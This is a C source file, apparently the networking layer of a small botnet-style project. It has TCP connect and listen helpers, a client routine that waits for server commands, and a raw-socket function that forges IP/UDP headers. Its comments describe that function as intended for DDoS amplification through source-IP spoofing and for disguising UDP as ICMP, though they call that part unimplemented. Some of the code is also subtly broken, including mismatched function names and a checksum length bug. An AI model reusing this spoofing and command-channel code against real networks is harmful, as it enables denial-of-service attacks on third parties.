#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <time.h>
#include <errno.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <netdb.h>
#include <arpa/inet.h>
#include "network_structs.h"

#define PCKT_LEN 8192

//FUNCTIONS FOR END USE
connection connect_to(char *dest_ip, int dest_port);
connection bind_socket(char *ip_address, int port);
int setMaster(struct machine *master);
int sendData(message data);
message rcvData();

//FUNCTIONS FOR INTERNAL USE
unsigned short csum(unsigned short *buf, int nwords);

connection connect_to(char *dest_ip, int dest_port)
{
    int sock_fd;
    struct sockaddr_in address;
    connection return_con;

    // Manually load values in to address
    address.sin_family = AF_INET;
    address.sin_port = htons(dest_port);
    inet_pton(AF_INET, dest_ip, &(address.sin_addr));

    // Create socket
    sock_fd = socket(PF_INET, SOCK_STREAM, 0);

    // Connect to socket, sleep if connection not available and retry
    int connect_return = 1;
    while (connect_return != 0)
    {
        connect_return = connect(sock_fd, (struct sockaddr *)&address, sizeof(address));
        if (connect_return == 0)
        {
            break;
        }

        // Add a little jitter to the retry attempts
        srand(time(NULL));
        int time_to_sleep = rand() % 10;
        sleep(time_to_sleep);
    }

    // We've connected, so fill struct and return
    return_con.dest_ip = dest_ip;
    return_con.dest_port = dest_port;
    return_con.sock_fd = sock_fd;
    return return_con;
}

connection bind_socket(char *ip_address, int port)
{
    int sock_fd;
    struct addrinfo hints;
    struct addrinfo *server_info, *results;
    struct sockaddr_storage client_addr;
    struct sockaddr_in *sa;
    sa = (struct sockaddr_in *)&client_addr;
    int optval = 1;

    // Convert port int to const char *
    char port_char[8];
    sprintf(port_char, "%d", port);

    // Ensure struct is empty and load values
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    getaddrinfo(ip_address, port_char, &hints, &server_info);

    // Loop through results and bind to socket - allow reuse of port
    for (results = server_info; results != NULL; results = results->ai_next)
    {
        sock_fd = socket(results->ai_family, results->ai_socktype, results->ai_protocol);
        setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
        bind(sock_fd, results->ai_addr, results->ai_addrlen);
        break;
    }

    // Free struct as no longer in use
    freeaddrinfo(server_info);

    listen(sock_fd, 20);

    // Return the connection
    connection return_con;
    return_con.dest_ip = ip_address;
    return_con.dest_port = port;
    return_con.sock_fd = sock_fd;
    return_con.client_addr = client_addr;
    return_con.sa = sa;
    return return_con;
}

// Used by the client to listen to the server for commands.
// Further functionality (not realised) would be to forward message to the destination client
message recieve_data(connection server)
{
    message rcvd_msg;
    rcvd_msg.bytes_recv = recv(server.sock_fd, rcvd_msg.data, 1024, 0);
    rcvd_msg.data[rcvd_msg.bytes_recv] = '\0';
    return rcvd_msg;
}

// Intended to be used to designate a specific machine in the list as a server. Not implemented.
int setMaster(struct machine *master)
{
    master->is_master = 1;
    return (0);
}

// Able to send UDP packets disguised as ICMP ping packets.
// Intended to be used for DDOS amplification by modification of the source IP. Not implemented.
int send_raw_data(message data, char *ddos_ip)
{
    // Retrieve machine from Message struct
    struct machine destination = data.dest_machine;
    struct machine source = data.source_machine;

    // Set up data structures for packet header
    u_int16_t src_port, dst_port;
    u_int32_t src_addr, dst_addr;
    src_addr = inet_addr(source.ip_address);
    dst_addr = inet_addr(destination.ip_address);
    src_port = source.open_port;
    dst_port = destination.open_port;
    int sd;
    char buffer[PCKT_LEN];
    struct iphdr *ip = (struct iphdr *)buffer;
    struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct iphdr));
    struct sockaddr_in sin;
    int one = 1;
    const int *val = &one;
    memset(buffer, 0, PCKT_LEN);

    // Ask the kernel to let us create a raw socket
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sd < 0)
    {
        return (1);
    }
    // Attempt to get permission from kernel to fill our own header
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        return (2);
    }

    // Fill sockaddr_in struct with relevant data
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dst_port);
    sin.sin_addr.s_addr = dst_addr;

    // Fabricate the IP header. This is where we can implement DDOS amplification attack.
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 16;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
    ip->id = htons(54321);
    ip->ttl = 64;
    // We can set the protocol to whatever we like, so long as both sides assume that it's UDP
    ip->protocol = destination.preferred_protocol;
    ip->saddr = src_addr;
    ip->daddr = dst_addr;

    // Fabricate the "udp" header
    udp->source = htons(src_port);
    udp->dest = htons(dst_port);
    udp->len = htons(sizeof(struct udphdr));

    // Calculate the checksum for integrity - https://opensourceforu.com/2015/03/a-guide-to-using-raw-sockets/
    ip->check = csum((unsigned short *)buffer,
                     sizeof(struct iphdr) + sizeof(struct udphdr));

    // Finally, let's send the packet.
    if (sendto(sd, buffer, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
    {
        return (3);
    }

    close(sd);
    return 0;
}

// Calculates the checksum of a raw packet - https://opensourceforu.com/2015/03/a-guide-to-using-raw-sockets/
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
    {
        sum += *buf++;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}
